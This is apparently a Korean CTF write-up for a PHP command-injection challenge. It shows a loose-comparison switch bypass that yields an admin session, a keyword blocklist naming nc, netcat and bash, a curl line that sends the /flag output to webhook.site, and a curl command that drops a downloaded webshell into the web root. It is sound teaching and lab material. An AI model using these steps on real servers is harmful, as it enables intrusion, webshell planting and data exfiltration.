---
tier: Silver 4
topics:
  - Command Injection
solved-with: Writeup
---
### 문제 구조

- `index.php`: POST 요청으로 받은 username이 admin이면 차단함. 그런데 다음 switch문에서는 admin인 경우 관리자 세션, 아닌 경우 게스트 세션을 줌. 
``` php
if($username === "admin" ){
    exit("no hack");
}

switch($username){
    case "admin":
        ...

```

- `test.php`: 관리자 세션인 경우, cmd 쿼리 파라미터를 받아서 실행하는데 
	1. 정규식으로 특정 단어 제외 
	2. `escapeshellcmd()`로 `;`, `|`, `&`, `$`, `>`, `<`, `\` 같은 기호를 연산자가 아닌 문자열로 처리
	
	또한 실행 결과를 `$resulttt`에 저장하기 때문에 화면에서 볼 수도 없음. 
	
``` php
$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';

if($_SESSION["auth"] === "admin"){

    $command = isset($_GET["cmd"]) ? $_GET["cmd"] : "ls";
    $sanitized_command = str_replace("\n","",$command);
    if (preg_match($pattern, $sanitized_command)){
        exit("No hack");
    }
    $resulttt = shell_exec(escapeshellcmd($sanitized_command));
}

```

- `Dockerfile`
``` Dockerfile
FROM php:8.0-apache

RUN apt-get update && \
    apt-get upgrade -y && \
    apt-get install -y gcc curl netcat-traditional

RUN docker-php-ext-install mysqli

COPY ./deploy/src /var/www/html/

COPY ./flag.c /flag.c
RUN gcc /flag.c -o /flag && \
    chmod 111 /flag && \
    rm /flag.c

EXPOSE 80
```
- `gcc /flag.c -o /flag`: `flag.c` 파일을 컴파일해서 실행 파일 `/flag`로 만들어둠. 
- `chmod 111 /flag`: 실행만 가능하도록 설정
- `apt-get install`
	- `gcc`: C 컴파일러
	- `curl`: HTTP 등을 통한 데이터 전송 도구
	- `netcat-traditional`: 네트워크 연결 및 데이터 송수신 도구

### 분석 및 풀이

`===`은 타입과 값을 비교하는 엄격한 비교이고 switch문은 값만 비교하는 느슨한 비교(`==`)를 사용함.
따라서username에 `true`를 넣으면 `true == '문자열'`은 느슨한 비교에서 통과하게 됨. 

curl을 통해서 webhoook으로 flag의 실행 결과를 보내려고 했는데 `escapeshellcmd()` 때문에 `$`가 문자열로 인식이 되어 실행된 결과를 보내지 못함. 
``` bash
curl -X POST -d "$(/f''lag)" "https://webhook.site"
```

웹셸을 해당 PHP 서버에서 설치하는게 낫다고 판단
``` bash
curl https://gist.githubusercontent.com/.../easy-simple-php-webshell.php -o /var/www/html/webshell.php
```
- 이 명령어는 `test.php?cmd=...`로 들어가서 PHP 서버(도커 컨테이너)에서 실행되는 명령어임. 
- 웹셸 php 파일을 제공하는 경로에서 다운로드한 파일을 `/var/www/html/webshell.php`로 저장. 

`/webshell.php`에서 `/flag`를 실행 가능

### 시행 착오

PHP 서버에서 bash 명령어로 파일을 다운로드 하는 것이 가능한줄 꿈에도 모르고 `test.php`에서 정규식과 `escapeshellcmd`를 우회하는 명령어를 찾느라 시간을 많이 할애함. 결국 AI가 우회 스크립트를 작성해서 풀기는 했지만 웹셸이라는 더 간단한 방법이 있었음. 

### 새롭게 배운 점

#### 느슨한 비교 우회

엄격한 비교 `===`: 타입과 값 비교 
느슨한 비교 `==`: 값만 비교, 필요하면 자바스크립트가 타입을 변환해서 비교함.

**우회**
`true == '문자열'`인 경우 문자열이 타입 변환을 해서 true로 바뀌기 때문에 통과함. 

#### Dockerfile

도커 파일을 잘 읽자. 

- `gcc /flag.c -o /flag`: `flag.c` 파일을 컴파일해서 실행 파일 `/flag`로 만들어둠. 
- `chmod 111 /flag`: 실행만 가능하도록 설정
- `apt-get install`
	- `gcc`: C 컴파일러
	- `curl`: HTTP 등을 통한 데이터 전송 도구
	- `netcat-traditional`: 네트워크 연결 및 데이터 송수신 도구

curl을 명시적으로 설치하지 않아도 베이스 이미지에 설치되어 있다면 사용 가능 (이 문제는 명시적으로 함으로써 답을 유도한 것임. )


#### curl -o 옵션

``` bash
curl [URL] -o [저장할 파일명]
curl https://example.com/hello.txt -o result.txt
```

1. `https://example.com/hello.txt`에 HTTP GET 요청을 보냄.
2. 서버에서 반환한 HTTP 응답 본문을 읽음.
3. 응답 본문을 현재 디렉터리의 `result.txt`에 저장함.